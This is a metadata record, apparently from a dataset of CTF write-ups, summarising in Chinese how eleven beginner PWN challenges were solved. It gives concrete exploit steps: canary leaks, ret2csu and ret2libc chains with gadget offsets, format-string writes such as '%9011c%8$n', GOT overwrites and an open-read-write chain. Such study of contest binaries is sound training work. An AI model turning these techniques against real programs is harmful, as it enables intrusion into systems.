...
quality: high
full_path: 从新生赛入门PWN.full.md
meta_path: 从新生赛入门PWN.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '从新生赛入门PWN。bad_c0de 新生赛 11 题 PWN 入门：canary/ret2csu/fmtstr/C++虚函数/ret2libc/orw。。关键路径：题 1 pivot: canary 0x28+7 字节截断 + start=0x4010d0 栈迁移 → 二次输入 0x37 字节泄 libc_base=u64(r(6))-128-0x29d10 → ret2libc: pop...'
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/99155.html
reasoning_chain:
- '题 1 pivot: canary 截断 7 字节 → 触发点：gets 截断 \x00'
- s(b'a'*0x28+b'\x10') ru(b'\x10') canary=u64(r(7).rjust(8,b'\x00')) → 栈迁移 start=0x4010d0
- 二次输入 0x37 字节泄 libc_base=u64(r(6))-128-0x29d10 → ret2libc pop_rdi+binsh+ret+system
- '题 2 ret2csu: pop_rdi=0x4012b3 + write(1, write_got, 8) 泄 libc + main 重入'
- '题 3 ret2text: 0x4011e5 0x108 溢出覆盖返回地址'
- '题 4 fmtstr_level2: fini_array=0x4031f0 改 start + %15$s 泄 puts + puts_got 改 system'
- '题 5 yellowgot: 任意地址读 puts_got + pop_rax 链 close+read+open+read+puts'
- pop_rdi=0x23b6a, pop_rsi=0x2601f, pop_rdx=0x142c92, pop_rax=0x36174
- 改 __stack_chk_fail=puts plt + atoi=gets → ORW shellcode 读 flag
- '题 6 treasure C++ 虚函数: edit 越界写 RareTreasure.description=DESC_FUNC* 指向 backdoor 0x40257A'
- '题 7 ret2libc: pop_rdi+puts_got+puts_plt+main 泄 libc + 二次溢出 system'
- '题 8 fmtstr_level1.5: %9011c%8$n + p64(0x4040A0) 写 4 字节'
failed_attempts:
- 试图直接覆盖 __free_hook → 失败：glibc 2.31 已移除 hook
- 试图单步写入 fini_array → 失败：fmtstr_payload 用错偏移
- 试图不泄 libc 直接 one_gadget → 失败：栈地址随机
key_observations:
- canary 截断 7 字节 + '\x10' 末尾恢复是 canary 绕过经典姿势
- ret2csu 用 0x4012aa 0x401290 中间跳板控制 rdi/rsi/rdx
- fini_array 写 fini_array[0]=start 触发 backdoor 是 got-less 二进制通用
- C++ 虚函数 vtable 改写 + edit 越界写 description = backdoor 地址
prerequisites:
- glibc stack canary 原理与截断恢复
